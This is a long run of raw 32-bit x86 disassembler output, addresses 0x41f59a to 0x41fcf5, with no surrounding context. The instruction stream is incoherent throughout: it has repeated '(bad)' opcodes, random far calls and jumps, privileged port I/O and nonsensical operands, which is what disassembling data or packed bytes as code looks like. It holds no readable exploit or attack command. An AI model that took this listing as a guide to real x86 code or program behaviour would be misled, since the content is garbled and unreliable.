  41f59a:	rcl    DWORD PTR [edi],0x64
  41f59d:	adc    DWORD PTR [esi+0x4ef90286],esi
  41f5a3:	add    al,0x43
  41f5a5:	fldenv [esi+0x7ff0313d]
  41f5ab:	(bad)  
  41f5ac:	call   0xb125:0xe1900a35
  41f5b3:	push   0x67
  41f5b5:	sbb    bh,BYTE PTR [ebx+0xf]
  41f5b8:	cmp    DWORD PTR [ebp-0x2e],esi
  41f5bb:	add    al,0x14
  41f5bd:	dec    edx
  41f5be:	fisub  DWORD PTR [eax-0x3fc0095]
  41f5c4:	out    0x33,eax
  41f5c6:	xor    DWORD PTR [edi-0x4e],edi
  41f5c9:	add    eax,eax
  41f5cb:	bound  ebp,QWORD PTR [esi+ebp*2]
  41f5ce:	add    al,0xfe
  41f5d0:	mov    esi,0xb8f2b7ee
  41f5d5:	push   ds
  41f5d6:	in     eax,0x3d
  41f5d8:	ret    
  41f5d9:	or     ecx,DWORD PTR [ebp+0x3a]
  41f5dc:	sti    
  41f5dd:	mov    edi,0xbae8fbde
  41f5e2:	out    dx,eax
  41f5e3:	ins    DWORD PTR es:[edi],dx
  41f5e4:	mov    ebp,0x66972d3
  41f5e9:	jns    0x41f5ba
  41f5eb:	ret    
  41f5ec:	sbb    al,0x66
  41f5ee:	mov    ch,0x2c
  41f5f0:	pop    es
  41f5f1:	aam    0x75
  41f5f3:	outs   dx,DWORD PTR ds:[esi]
  41f5f4:	aad    0x5e
  41f5f6:	add    bl,BYTE PTR ds:0x22e9bac5
  41f5fc:	outs   dx,BYTE PTR ds:[esi]
  41f5fd:	and    DWORD PTR [ebp-0x60cd5c82],ebx
  41f603:	and    ebp,DWORD PTR [esi]
  41f605:	pop    eax
  41f606:	sbb    eax,0x282b3ca1
  41f60b:	sub    esi,DWORD PTR [esi+eiz*2+0x3b]
  41f60f:	inc    ebx
  41f610:	test   DWORD PTR [ebx-0x3d],ebx
  41f613:	mov    edx,0x11088165
  41f618:	popa   
  41f619:	jno    0x41f617
  41f61b:	xlat   BYTE PTR ds:[ebx]
  41f61c:	or     eax,0x84d14d49
  41f621:	fadd   QWORD PTR [edi+0x14]
  41f624:	pop    edx
  41f625:	or     ebp,DWORD PTR [edi-0x67335af7]
  41f62b:	mov    BYTE PTR [eax+0x40e8eaac],bh
  41f631:	jecxz  0x41f696
  41f633:	test   ecx,eax
  41f635:	push   ds
  41f636:	jmp    0x41f644
  41f638:	or     ebp,esp
  41f63a:	int    0xe7
  41f63c:	out    dx,eax
  41f63d:	or     DWORD PTR [ebp+ebp*4+0x5a],edx
  41f641:	ret    0xb034
  41f644:	push   ss
  41f645:	adc    ah,0xa2
  41f648:	call   0x5b53:0x81eb3594
  41f64f:	outs   dx,DWORD PTR ds:[esi]
  41f650:	dec    ebx
  41f651:	lods   al,BYTE PTR cs:[esi]
  41f653:	loope  0x41f601
  41f655:	push   eax
  41f656:	xchg   ecx,eax
  41f657:	pop    edi
  41f658:	push   ecx
  41f659:	bound  esi,QWORD PTR [edi-0x60b722e]
  41f65f:	repnz inc edx
  41f661:	xchg   esi,eax
  41f662:	push   esi
  41f663:	sahf   
  41f664:	pop    eax
  41f665:	(bad)  
  41f666:	imul   DWORD PTR [edi]
  41f668:	mov    ds:0xfe8ea61c,al
  41f66d:	rcr    BYTE PTR fs:[eax],0x6
  41f671:	or     al,0x7b
  41f673:	stos   BYTE PTR es:[edi],al
  41f674:	jecxz  0x41f6f1
  41f676:	rcr    BYTE PTR [edi-0x1f873e31],1
  41f67c:	push   0x253249cd
  41f681:	mov    edx,0xe456f265
  41f686:	push   ebp
  41f687:	daa    
  41f688:	stos   BYTE PTR es:[edi],al
  41f689:	inc    esp
  41f68a:	mov    ebp,0x9d681081
  41f68f:	push   cs
  41f690:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f691:	ret    0x1de3
  41f694:	pusha  
  41f695:	pop    ss
  41f696:	inc    eax
  41f697:	jge    0x41f70c
  41f699:	push   edx
  41f69a:	pop    ecx
  41f69b:	and    al,BYTE PTR [edx]
  41f69d:	std    
  41f69e:	enter  0x8b18,0x47
  41f6a2:	es cwde 
  41f6a4:	mov    dl,0x36
  41f6a6:	loope  0x41f639
  41f6a8:	pop    esi
  41f6a9:	adc    DWORD PTR [ebp-0x4f],0xfffffffa
  41f6ad:	xor    edx,DWORD PTR [ebx-0x58262e02]
  41f6b3:	sbb    bh,BYTE PTR [esi+0x362f653a]
  41f6b9:	jns    0x41f6ab
  41f6bb:	nop
  41f6bc:	pshufw mm2,QWORD PTR [ecx],0x5d
  41f6c0:	cmp    BYTE PTR [esi],al
  41f6c2:	imul   esi,DWORD PTR [esi+0xb79c5aa],0xb53398c2
  41f6cc:	and    dl,BYTE PTR [esi+0x573a3311]
  41f6d2:	jno    0x41f65f
  41f6d4:	outs   dx,DWORD PTR ds:[esi]
  41f6d5:	xchg   BYTE PTR [eax-0x21],cl
  41f6d8:	inc    ebp
  41f6d9:	inc    edi
  41f6da:	xchg   ecx,eax
  41f6db:	pop    ebx
  41f6dc:	xor    eax,0x8680b5d5
  41f6e1:	xchg   esp,eax
  41f6e2:	out    0xfe,al
  41f6e4:	add    ebx,DWORD PTR [esp+eax*8-0x73]
  41f6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e9:	push   edi
  41f6ea:	lock or dl,bh
  41f6ed:	mov    ch,BYTE PTR [ecx+0x38]
  41f6f0:	test   eax,0xf3bd7a93
  41f6f5:	add    DWORD PTR [edi],0x11720565
  41f6fb:	stc    
  41f6fc:	mov    eax,ds:0xdbf8ee7d
  41f701:	add    eax,0x852cd403
  41f706:	cmp    eax,0x85cc4692
  41f70b:	loop   0x41f6f9
  41f70d:	stos   BYTE PTR es:[edi],al
  41f70e:	out    0x44,al
  41f710:	(bad)  
  41f711:	sti    
  41f712:	cmc    
  41f713:	or     ecx,DWORD PTR [bx+0x66c1]
  41f718:	adc    DWORD PTR [edx+0xf],ecx
  41f71b:	pop    ebp
  41f71c:	jmp    0x48f9:0x7b258fae
  41f723:	call   0x9d3eb805
  41f728:	and    dl,bh
  41f72a:	fwait
  41f72b:	add    dl,al
  41f72d:	or     ecx,0xa62d882
  41f733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f734:	push   edi
  41f735:	jnp    0x41f732
  41f737:	pop    eax
  41f738:	add    DWORD PTR [ebp-0x45],edi
  41f73b:	stos   DWORD PTR es:[edi],eax
  41f73c:	outs   dx,DWORD PTR ds:[esi]
  41f73d:	push   eax
  41f73e:	cwde   
  41f73f:	or     al,0xf6
  41f741:	(bad)  
  41f742:	add    al,BYTE PTR [esp]
  41f745:	iret   
  41f746:	sti    
  41f747:	mov    al,0x9d
  41f749:	rol    DWORD PTR [ebp+0x69f12a18],1
  41f74f:	push   eax
  41f750:	sbb    ebp,DWORD PTR [ebx+eax*8-0x11]
  41f754:	xchg   DWORD PTR [ecx-0x3f],edi
  41f757:	or     cl,cl
  41f759:	imul   edi,DWORD PTR ds:0x8558e1f,0xaca397dc
  41f763:	arpl   WORD PTR [edi],ax
  41f765:	lahf   
  41f766:	push   edx
  41f767:	jp     0x41f787
  41f769:	mov    DWORD PTR [edx+0x4df598e7],esi
  41f76f:	push   ds
  41f770:	ins    BYTE PTR es:[edi],dx
  41f771:	push   eax
  41f772:	sti    
  41f773:	sub    bh,BYTE PTR [ecx+0x8]
  41f776:	sub    eax,0x284db8c9
  41f77b:	or     eax,0xc57ce53c
  41f780:	add    eax,0x6ddf3e58
  41f785:	mov    eax,ds:0x53ccc10c
  41f78a:	add    DWORD PTR [ebx+0x22],eax
  41f78d:	inc    edi
  41f78e:	std    
  41f78f:	sti    
  41f790:	dec    edx
  41f791:	adc    ch,BYTE PTR [ecx-0x4d]
  41f794:	adc    DWORD PTR [eax-0x46],esp
  41f797:	fild   QWORD PTR [eax+0x51]
  41f79a:	sar    BYTE PTR [esi+edi*4+0x6a5c0458],0x42
  41f7a2:	dec    ecx
  41f7a3:	int    0x44
  41f7a5:	dec    ebx
  41f7a6:	cmp    DWORD PTR [edx-0x4a43eec1],esi
  41f7ac:	xor    dh,BYTE PTR ds:[esp+eax*1-0x54f58c1c]
  41f7b4:	test   eax,0xf8db3041
  41f7b9:	jns    0x41f7db
  41f7bb:	inc    eax
  41f7bc:	mov    ah,BYTE PTR [ecx+0x3db94e7f]
  41f7c2:	mov    BYTE PTR ds:0xd7406008,0x9c
  41f7c9:	mov    bl,0x85
  41f7cb:	mov    ch,0x17
  41f7cd:	addr16 cmc 
  41f7cf:	ins    DWORD PTR es:[edi],dx
  41f7d0:	fwait
  41f7d1:	je     0x41f7c6
  41f7d3:	mov    DWORD PTR [eax],edi
  41f7d5:	retf   
  41f7d6:	add    esi,DWORD PTR [ecx+0xa]
  41f7d9:	out    0xd,eax
  41f7db:	add    al,0xa3
  41f7dd:	out    dx,al
  41f7de:	adc    BYTE PTR [eax+eax*4],bl
  41f7e1:	and    BYTE PTR [edx],0x79
  41f7e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e5:	inc    ebx
  41f7e6:	ret    
  41f7e7:	ss in  eax,dx
  41f7e9:	xor    ebx,edx
  41f7eb:	mov    ah,0x6b
  41f7ed:	(bad)  
  41f7ee:	cdq    
  41f7ef:	in     eax,dx
  41f7f0:	out    0x9e,al
  41f7f2:	adc    esi,eax
  41f7f4:	inc    esp
  41f7f5:	lea    ecx,[ebp+0x63]
  41f7f8:	sahf   
  41f7f9:	sti    
  41f7fa:	pop    edi
  41f7fb:	mov    eax,0xd839573
  41f800:	sbb    ebp,DWORD PTR [ebx-0x66]
  41f803:	ficomp DWORD PTR [ecx-0x7a]
  41f806:	gs jb  0x41f828
  41f809:	sbb    DWORD PTR [ecx-0x32a4d0da],edx
  41f80f:	test   bl,ah
  41f811:	xor    DWORD PTR [ecx+0x18dc0b8c],ebp
  41f817:	pop    edi
  41f818:	pushf  
  41f819:	iret   
  41f81a:	lock push 0x7
  41f81d:	push   eax
  41f81e:	mov    bh,0x61
  41f820:	aas    
  41f821:	mov    eax,ds:0x61076f2d
  41f826:	fcmovne st,st(2)
  41f828:	pop    es
  41f829:	fbstp  TBYTE PTR [ecx+0x194cd276]
  41f82f:	stos   DWORD PTR es:[edi],eax
  41f830:	stos   BYTE PTR es:[edi],al
  41f831:	sub    bh,bh
  41f833:	sub    BYTE PTR [ebx],ah
  41f835:	jle    0x41f7bf
  41f837:	ins    DWORD PTR es:[edi],dx
  41f838:	test   bh,dh
  41f83a:	and    BYTE PTR [eax+eiz*8-0x5a],ch
  41f83e:	jg     0x41f7f8
  41f840:	js     0x41f8ba
  41f842:	push   0xffffffd1
  41f844:	stos   BYTE PTR es:[edi],al
  41f845:	add    ecx,DWORD PTR [ecx-0x6b8b279f]
  41f84b:	cdq    
  41f84c:	xor    BYTE PTR [eax+0x12],dh
  41f84f:	xchg   DWORD PTR [eax-0x30abe0ca],ecx
  41f855:	call   0x46039e9
  41f85a:	ins    BYTE PTR es:[edi],dx
  41f85b:	pop    edi
  41f85c:	mov    esi,0xc7842f38
  41f861:	outs   dx,DWORD PTR ds:[esi]
  41f862:	add    BYTE PTR [ebp+edi*8-0x55],bl
  41f866:	aam    0x6b
  41f868:	out    dx,al
  41f869:	sub    al,0xff
  41f86b:	sar    BYTE PTR [esi+0x16],cl
  41f86e:	pusha  
  41f86f:	test   BYTE PTR [ecx+ecx*2+0x688ad9ed],bl
  41f876:	movzx  eax,WORD PTR [edx+0x3fa05244]
  41f87d:	sar    BYTE PTR [ecx],0x3d
  41f880:	fs mov edi,0x38b46f5b
  41f886:	sbb    DWORD PTR [ebx-0x4901ef1b],edx
  41f88c:	push   0xffffffc4
  41f88e:	sti    
  41f88f:	sbb    DWORD PTR [eax],edx
  41f891:	arpl   WORD PTR [ecx-0x2f],bx
  41f894:	scas   eax,DWORD PTR es:[edi]
  41f895:	add    cl,ch
  41f897:	mov    BYTE PTR [ecx-0x3c],ah
  41f89a:	xor    BYTE PTR [ecx+0x57],ah
  41f89d:	xor    BYTE PTR [edi-0x70],al
  41f8a0:	cld    
  41f8a1:	or     al,0x53
  41f8a3:	mov    WORD PTR [eax],cs
  41f8a5:	pushf  
  41f8a6:	cmp    cl,BYTE PTR [ecx+0x47bb9d1a]
  41f8ac:	out    0x9d,eax
  41f8ae:	sbb    eax,0xbf174b31
  41f8b3:	sahf   
  41f8b4:	inc    edi
  41f8b5:	data16 mov al,ds:0xc33700c3
  41f8bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8bc:	(bad)  
  41f8bd:	sub    BYTE PTR [eax],ah
  41f8bf:	stc    
  41f8c0:	jmp    0x41f857
  41f8c2:	mov    DWORD PTR [esi],esp
  41f8c4:	xchg   ecx,eax
  41f8c5:	inc    esi
  41f8c6:	sbb    eax,0xe03100ca
  41f8cb:	xor    al,0x2d
  41f8cd:	inc    eax
  41f8ce:	mov    ecx,0x4adda9d8
  41f8d3:	sub    edi,edx
  41f8d5:	scas   eax,DWORD PTR es:[edi]
  41f8d6:	sti    
  41f8d7:	or     DWORD PTR [eax+0x27b527d1],eax
  41f8dd:	fstp   DWORD PTR [ecx-0x5bc48554]
  41f8e3:	cmp    al,0x8
  41f8e5:	or     eax,0x2154e36c
  41f8ea:	inc    esi
  41f8eb:	cmp    bl,BYTE PTR [ecx+0x5d7ce70d]
  41f8f1:	std    
  41f8f2:	and    ebp,DWORD PTR [edx-0x20]
  41f8f5:	fisttp WORD PTR [ecx-0x254cc989]
  41f8fb:	jmp    FWORD PTR [eax+0x5931c64c]
  41f901:	jmp    0x41f93a
  41f903:	and    dl,BYTE PTR [esi+eiz*8+0x78cee8df]
  41f90a:	add    BYTE PTR [ecx],cl
  41f90c:	xor    bl,BYTE PTR [edx-0x50]
  41f90f:	xchg   edx,eax
  41f910:	xlat   BYTE PTR ds:[ebx]
  41f911:	pop    ss
  41f912:	gs rol dl,1
  41f915:	push   es
  41f916:	in     eax,dx
  41f917:	mov    ds:0x9fa8ba4f,eax
  41f91c:	and    cl,BYTE PTR [eax+edi*4-0x1f]
  41f920:	mov    ecx,DWORD PTR [edi-0x836ead2]
  41f926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f927:	cmp    eax,0xb3160f74
  41f92c:	out    dx,al
  41f92d:	add    edx,DWORD PTR [ebx-0x46]
  41f930:	push   ebx
  41f931:	mov    esi,0xdf5fdf25
  41f936:	add    DWORD PTR [edx],esi
  41f938:	sub    esi,esi
  41f93a:	int3   
  41f93b:	inc    esi
  41f93c:	shl    ecx,cl
  41f93e:	and    bl,BYTE PTR [edi]
  41f940:	jecxz  0x41f8fa
  41f942:	jns    0x41f919
  41f944:	add    DWORD PTR [ebx-0xe1f7eb6],esp
  41f94a:	(bad)  
  41f94b:	cld    
  41f94c:	push   ebx
  41f94d:	repz leave 
  41f94f:	jle    0x41f922
  41f951:	leave  
  41f952:	adc    BYTE PTR [edx-0x4f],dl
  41f955:	inc    edx
  41f956:	xchg   BYTE PTR [edi+0x6e],ch
  41f959:	test   al,0xca
  41f95b:	push   edx
  41f95c:	aam    0x8b
  41f95e:	mov    ebx,0x566d5dff
  41f963:	shl    BYTE PTR [ecx+0x490d04e1],0xf1
  41f96a:	mov    esi,0x51270224
  41f96f:	(bad)  
  41f970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f971:	out    dx,eax
  41f972:	or     al,0xfd
  41f974:	inc    ebx
  41f975:	add    BYTE PTR [esi+0x4683b30e],al
  41f97b:	shr    BYTE PTR [edi+0x5],1
  41f97e:	dec    esi
  41f97f:	mov    ds:0xa4b8a50f,eax
  41f984:	push   es
  41f985:	dec    eax
  41f986:	lea    edi,[edi+ecx*2-0x2d039550]
  41f98d:	pop    edx
  41f98e:	stc    
  41f98f:	add    cl,BYTE PTR [ebx]
  41f991:	lds    edi,FWORD PTR [ebp-0x1e235e3b]
  41f997:	or     DWORD PTR [ebx],0x51854262
  41f99d:	and    cl,BYTE PTR [edi]
  41f99f:	pop    edx
  41f9a1:	je     0x41f9b1
  41f9a3:	test   BYTE PTR [ebx],ch
  41f9a5:	xchg   edx,eax
  41f9a6:	jecxz  0x41f9de
  41f9a8:	js     0x41f9de
  41f9aa:	sbb    BYTE PTR [edx+0x7d011deb],dh
  41f9b0:	repnz outs dx,BYTE PTR ds:[esi]
  41f9b2:	and    edx,esi
  41f9b4:	adc    ecx,DWORD PTR [edx+ebx*4-0x20]
  41f9b8:	cmc    
  41f9b9:	inc    ebx
  41f9ba:	jnp    0x41f9f2
  41f9bc:	imul   esi,DWORD PTR ds:0xb7c120b3,0x64476e1d
  41f9c6:	or     eax,0x670abc13
  41f9cb:	mov    fs,WORD PTR [eax-0x71]
  41f9ce:	push   cs
  41f9cf:	rcl    DWORD PTR ds:0x83ebcb80,cl
  41f9d5:	jae    0x41f9bf
  41f9d7:	ins    BYTE PTR es:[edi],dx
  41f9d8:	sub    eax,0x7f39aca5
  41f9dd:	cmp    edi,DWORD PTR [edx]
  41f9df:	(bad)  
  41f9e0:	scas   al,BYTE PTR es:[edi]
  41f9e1:	sbb    edi,DWORD PTR [edi]
  41f9e3:	mov    cs,WORD PTR [ebx+0x5c]
  41f9e6:	pop    ebp
  41f9e7:	lods   eax,DWORD PTR ds:[esi]
  41f9e8:	into   
  41f9e9:	dec    edx
  41f9ea:	add    al,0xd4
  41f9ec:	test   DWORD PTR [ebx-0x19],eax
  41f9ef:	push   eax
  41f9f0:	addr16 xchg edx,eax
  41f9f2:	rol    BYTE PTR [ecx],0xb1
  41f9f5:	xchg   esp,eax
  41f9f6:	fiadd  DWORD PTR [edi+0x189b02b]
  41f9fc:	lock fs mov ebp,0x1fe77594
  41fa03:	jo     0x41f9fe
  41fa05:	call   0xb797b0d6
  41fa0a:	outs   dx,BYTE PTR ds:[esi]
  41fa0b:	into   
  41fa0c:	mov    al,ds:0xc3b78b95
  41fa11:	dec    edx
  41fa12:	push   ecx
  41fa13:	cmp    al,BYTE PTR [esi]
  41fa15:	inc    ecx
  41fa16:	mov    dh,0xb1
  41fa18:	inc    edi
  41fa19:	in     eax,dx
  41fa1a:	pop    es
  41fa1b:	mov    dl,0xa
  41fa1d:	std    
  41fa1e:	sti    
  41fa1f:	pop    ds
  41fa20:	jbe    0x41fa52
  41fa22:	mov    ebx,0x74ad8f66
  41fa27:	mov    ss,WORD PTR [ecx+0x1e4aa1d7]
  41fa2d:	popa   
  41fa2e:	hlt    
  41fa2f:	aaa    
  41fa30:	dec    ecx
  41fa31:	js     0x41fa73
  41fa33:	idiv   bh
  41fa35:	jae    0x41fa34
  41fa37:	shr    DWORD PTR [edi-0x5f569d5f],1
  41fa3d:	ja     0x41fa11
  41fa3f:	mov    esp,0xc1617122
  41fa44:	and    eax,0x75f5fb98
  41fa49:	mov    esp,0x80fc554f
  41fa4e:	repnz sbb eax,0xfc8a5860
  41fa54:	or     esi,DWORD PTR [eax]
  41fa56:	jge    0x41fa1f
  41fa58:	fsub   st(1),st
  41fa5a:	rol    BYTE PTR [esi-0x501b7b1d],1
  41fa60:	xchg   esi,eax
  41fa61:	loop   0x41fa06
  41fa63:	idiv   DWORD PTR [eax+0x4646668f]
  41fa69:	mov    dl,BYTE PTR [edi]
  41fa6b:	jae    0x41fa74
  41fa6d:	sbb    BYTE PTR [edx+edx*2-0x32790d96],0xd0
  41fa75:	push   ds
  41fa76:	aas    
  41fa77:	mov    ebp,edi
  41fa79:	stc    
  41fa7a:	ja     0x41fa04
  41fa7c:	cwde   
  41fa7d:	mov    ebp,0x23c23243
  41fa82:	call   0x61b0a51f
  41fa87:	mov    dh,0x6d
  41fa89:	call   0x4b80b7ba
  41fa8e:	enter  0xabce,0x53
  41fa92:	inc    ebp
  41fa93:	push   ds
  41fa94:	imul   eax,DWORD PTR [eax-0x6b77e222],0x77
  41fa9b:	call   0xe38:0x4b7ab698
  41faa2:	sub    eax,0xf15dc439
  41faa7:	call   0x1f1:0xddec13a8
  41faae:	sub    DWORD PTR [ecx+0x6b],ecx
  41fab1:	mov    bl,0x7f
  41fab3:	in     al,0x99
  41fab5:	adc    dl,BYTE PTR [edi-0x88d3812]
  41fabb:	andps  xmm3,XMMWORD PTR [edx]
  41fabe:	mov    edx,0x39ca628
  41fac3:	add    edi,DWORD PTR [ebx-0x9]
  41fac6:	sbb    bh,BYTE PTR [ebx]
  41fac8:	lahf   
  41fac9:	ffree  st(6)
  41facb:	cmp    edi,DWORD PTR [ebp+ecx*2-0x11]
  41facf:	sbb    eax,0xf63d3a6e
  41fad4:	stc    
  41fad5:	mov    BYTE PTR [ecx],dh
  41fad7:	adc    DWORD PTR [esi],ebp
  41fad9:	repz push edx
  41fadb:	add    dh,BYTE PTR [esi]
  41fadd:	push   ebx
  41fade:	jmp    0x41fb59
  41fae0:	pop    ebx
  41fae1:	xchg   BYTE PTR [ecx-0x37fc5e59],bl
  41fae7:	retf   0x23de
  41faea:	push   ss
  41faeb:	iret   
  41faec:	clc    
  41faed:	inc    ebp
  41faee:	pop    ebp
  41faef:	bound  edx,QWORD PTR [edi]
  41faf1:	push   ebx
  41faf2:	outs   dx,DWORD PTR ds:[esi]
  41faf3:	pop    es
  41faf4:	outs   dx,BYTE PTR ds:[esi]
  41faf5:	shl    BYTE PTR [esi],cl
  41faf7:	sub    eax,0xe504c99e
  41fafc:	jbe    0x41fb5e
  41fafe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41faff:	sub    ecx,DWORD PTR [ecx+0x21]
  41fb02:	jp     0x41fb60
  41fb04:	add    esi,ebx
  41fb06:	jo     0x41fabe
  41fb08:	xor    eax,DWORD PTR [edi]
  41fb0a:	loop   0x41faee
  41fb0c:	data16 lods al,BYTE PTR ds:[esi]
  41fb0e:	icebp  
  41fb0f:	mov    bh,0x90
  41fb12:	(bad)  
  41fb13:	dec    ebp
  41fb14:	mov    ah,0xc8
  41fb16:	xchg   DWORD PTR [eax-0x1cb7a985],eax
  41fb1c:	push   cs
  41fb1d:	stc    
  41fb1e:	xor    al,dl
  41fb20:	add    al,0x33
  41fb22:	push   0x8efd17b0
  41fb27:	fnstcw WORD PTR [edi+0x19]
  41fb2a:	xchg   esp,eax
  41fb2b:	mov    cl,BYTE PTR [ecx+eax*4+0x18]
  41fb2f:	jge    0x41fb81
  41fb31:	ficom  WORD PTR [esi+0x1d]
  41fb34:	cmc    
  41fb35:	loop   0x41fb1b
  41fb37:	cdq    
  41fb38:	enter  0x4d89,0xd7
  41fb3c:	fwait
  41fb3d:	and    bl,dh
  41fb3f:	pusha  
  41fb40:	adc    eax,0xaa04474
  41fb45:	adc    al,0xd7
  41fb47:	cmp    bl,dh
  41fb49:	jg     0x41fb40
  41fb4b:	push   edx
  41fb4c:	ins    BYTE PTR es:[edi],dx
  41fb4d:	into   
  41fb4e:	xor    edx,ecx
  41fb50:	ins    DWORD PTR es:[edi],dx
  41fb51:	inc    esi
  41fb52:	popf   
  41fb53:	cmp    al,0xc7
  41fb55:	jae    0x41fbcd
  41fb57:	and    BYTE PTR [edi-0x59],al
  41fb5a:	cmc    
  41fb5b:	adc    DWORD PTR [ebp+esi*4-0x7a],esi
  41fb5f:	sub    eax,0x2ea122aa
  41fb64:	je     0x41fbe5
  41fb66:	pop    esp
  41fb67:	in     al,0x9e
  41fb69:	call   0xc85a9556
  41fb6e:	(bad)  
  41fb6f:	test   eax,0xda8c87c2
  41fb74:	mov    DWORD PTR [ecx+edi*4+0x7e90a9a5],edx
  41fb7b:	clc    
  41fb7c:	pop    ss
  41fb7d:	add    eax,0x54457667
  41fb82:	push   ss
  41fb83:	hlt    
  41fb84:	in     al,0x6
  41fb86:	cli    
  41fb87:	sub    eax,0x1e60d347
  41fb8c:	fwait
  41fb8d:	(bad)  
  41fb8e:	fadd   DWORD PTR [edx]
  41fb90:	mov    ecx,0x9e65a3b8
  41fb95:	lock or ebp,DWORD PTR [ecx+0x44]
  41fb99:	push   ebx
  41fb9a:	dec    eax
  41fb9b:	mov    eax,DWORD PTR [edx+ebp*4]
  41fb9e:	pop    ecx
  41fb9f:	inc    ebx
  41fba0:	std    
  41fba1:	sbb    eax,0x7b5af4b0
  41fba6:	push   0xe79f96a1
  41fbab:	iret   
  41fbac:	push   ss
  41fbad:	pop    ds
  41fbae:	inc    ecx
  41fbaf:	cs jns 0x41fb84
  41fbb2:	pop    esp
  41fbb3:	jmp    0xc1cf00c1
  41fbb8:	xor    cl,BYTE PTR [edx-0x2d]
  41fbbb:	iret   
  41fbbc:	mov    cl,0x72
  41fbbe:	xor    ecx,DWORD PTR [ecx+ebx*4]
  41fbc1:	rol    DWORD PTR [ebx],cl
  41fbc3:	mov    bl,0xc7
  41fbc5:	pop    ebp
  41fbc6:	es pop edi
  41fbc8:	mov    edi,0x1e49faf7
  41fbcd:	je     0x41fbc6
  41fbcf:	fmul   QWORD PTR [edi+ebp*1+0x76ee63bd]
  41fbd6:	retf   
  41fbd7:	test   eax,0x9281f5d6
  41fbdc:	cmp    DWORD PTR [edx-0x20c15244],0x2c7e00d1
  41fbe6:	push   eax
  41fbe7:	sar    BYTE PTR [ebp-0xc],1
  41fbea:	inc    ebx
  41fbeb:	mov    bh,0x35
  41fbed:	js     0x41fbdf
  41fbef:	shl    BYTE PTR [ebx-0x53f766d3],cl
  41fbf5:	jae    0x41fc1a
  41fbf7:	(bad)  
  41fbf8:	sbb    al,0x8f
  41fbfa:	test   al,0xe9
  41fbfc:	and    ebx,DWORD PTR [edi-0x509d71b6]
  41fc02:	stos   BYTE PTR es:[edi],al
  41fc03:	dec    ebp
  41fc04:	clc    
  41fc05:	dec    edi
  41fc06:	and    edx,edx
  41fc08:	test   eax,0x1b264e4d
  41fc0d:	loope  0x41fbb7
  41fc0f:	dec    esi
  41fc10:	(bad)  
  41fc11:	int    0x3a
  41fc13:	les    esi,FWORD PTR [ecx+0x6]
  41fc16:	sbb    cl,BYTE PTR [ebp-0x29b2f2b3]
  41fc1c:	out    dx,al
  41fc1d:	sbb    al,0x6a
  41fc1f:	test   al,0xd0
  41fc21:	in     eax,dx
  41fc22:	lahf   
  41fc23:	sbb    BYTE PTR [eax],0xf0
  41fc26:	test   al,0x4
  41fc28:	les    edx,FWORD PTR ds:0xfb21d22f
  41fc2e:	push   eax
  41fc2f:	cmp    BYTE PTR [ebp-0x15],bh
  41fc32:	loop   0x41fc40
  41fc34:	add    al,0x9
  41fc36:	test   BYTE PTR [esi+0x79],bh
  41fc39:	cmp    ch,BYTE PTR [ebx-0x7c69435]
  41fc3f:	leave  
  41fc40:	xchg   edx,eax
  41fc41:	or     ecx,eax
  41fc43:	sbb    ebx,DWORD PTR [ebp+0x30a4b864]
  41fc49:	stos   BYTE PTR es:[edi],al
  41fc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fc4b:	retf   
  41fc4c:	dec    eax
  41fc4d:	push   DWORD PTR [esi+0x53]
  41fc50:	fist   WORD PTR [esi+0x6e]
  41fc53:	jnp    0x41fc6b
  41fc55:	outs   dx,DWORD PTR ds:[esi]
  41fc56:	ins    BYTE PTR es:[edi],dx
  41fc57:	xlat   BYTE PTR ds:[ebx]
  41fc58:	retf   
  41fc59:	out    dx,al
  41fc5a:	adc    eax,0x794746b0
  41fc5f:	adc    esi,0x20
  41fc62:	js     0x41fc92
  41fc64:	(bad)  
  41fc65:	rol    ebx,1
  41fc67:	or     DWORD PTR [edx+0x7a],edx
  41fc6a:	mov    es,WORD PTR [esi-0x5f]
  41fc6d:	xchg   ebp,eax
  41fc6e:	(bad)  
  41fc70:	sub    DWORD PTR [ebx],0xa773b0c
  41fc76:	jae    0x41fcbd
  41fc78:	push   eax
  41fc79:	pop    eax
  41fc7a:	mov    bl,0xf8
  41fc7c:	pushf  
  41fc7d:	popf   
  41fc7e:	pop    ebx
  41fc7f:	xor    eax,edx
  41fc81:	xor    al,0xb4
  41fc83:	mov    dl,0x3
  41fc85:	pop    ecx
  41fc86:	(bad)  
  41fc87:	lds    ecx,FWORD PTR [edi+0x14dfffb7]
  41fc8d:	push   edx
  41fc8e:	sub    BYTE PTR [ebx-0x4e0e2b89],bl
  41fc94:	and    BYTE PTR [edx],dl
  41fc96:	js     0x41fc8c
  41fc98:	mov    ebx,0x7d2237cb
  41fc9d:	jb     0x41fc76
  41fc9f:	outs   dx,DWORD PTR ds:[esi]
  41fca0:	adc    ah,al
  41fca2:	sar    BYTE PTR [esi],0x37
  41fca5:	sbb    ah,0x87
  41fca8:	imul   ebp,edx,0x3c021521
  41fcae:	sbb    DWORD PTR [edx+esi*2],ebx
  41fcb1:	jl     0x41fcce
  41fcb3:	pop    eax
  41fcb4:	(bad)  
  41fcb5:	xor    edx,DWORD PTR [eax]
  41fcb7:	loopne 0x41fc46
  41fcb9:	std    
  41fcba:	cmp    dl,BYTE PTR [ebx+0x7688dc0c]
  41fcc0:	push   cs
  41fcc1:	adc    al,0xd5
  41fcc3:	scas   eax,DWORD PTR es:[edi]
  41fcc4:	adc    eax,0xd102c234
  41fcc9:	mov    eax,ds:0x28eb4aeb
  41fcce:	fadd   DWORD PTR [ebp+0x4b826ac5]
  41fcd4:	or     dl,BYTE PTR [ecx+ebp*1+0x69d9bf91]
  41fcdb:	adc    eax,0xa45164cc
  41fce0:	les    ecx,FWORD PTR ds:0xe73765e0
  41fce6:	push   edx
  41fce7:	xchg   ebx,eax
  41fce8:	adc    DWORD PTR [eax],edx
  41fcea:	into   
  41fceb:	js     0x41fcbc
  41fced:	sub    al,dh
  41fcef:	push   ebx
  41fcf0:	add    al,0xb
  41fcf2:	loope  0x41fd26
  41fcf4:	pop    es
  41fcf5:	mov    ch,0x14
